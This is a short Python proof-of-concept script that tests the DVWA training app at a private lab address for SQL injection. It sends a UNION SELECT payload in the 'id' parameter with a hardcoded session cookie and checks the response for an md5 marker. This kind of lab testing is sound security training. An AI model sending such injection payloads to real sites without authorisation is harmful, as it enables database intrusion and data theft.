# -*- coding: utf-8 -*-
"""
@Project  :dvwa-POC
@File     :dvwa-Sql.py
@Date     :2022/5/9 15:35
@Author   :7-R2X

"""

import requests
import hashlib
import random

# dvwa需要带上可用的cookie
cookies = {
    'PHPSESSID': 'cigkmpp2fo5mg1ql8g2h63cut3',
    'security': 'low',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Connection': 'keep-alive',
    # Requests sorts cookies= alphabetically
    # 'Cookie': 'PHPSESSID=cigkmpp2fo5mg1ql8g2h63cut3; security=low',
    'DNT': '1',
    'Referer': 'http://192.168.163.131:8080/vulnerabilities/sqli/',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36',
    'sec-gpc': '1',
}
# 随机获取一个随机数
random_num = str(random.random())
# 传递随机数
params = {
    'id': '-1\' union select 1,md5({}) #'.format(random_num),
    'Submit': 'Submit',
}

# md5
md = hashlib.md5()
md.update(random_num.encode('utf-8'))
print(md.hexdigest())

# 发起请求
response = requests.get('http://192.168.163.131:8080/vulnerabilities/sqli/', params=params, cookies=cookies,
                        headers=headers, verify=False)

# 对比md5加密之后的值，判断漏洞是否存在
if md.hexdigest() in response.text:
    print(md.hexdigest())
    print('存在SQL注入漏洞')
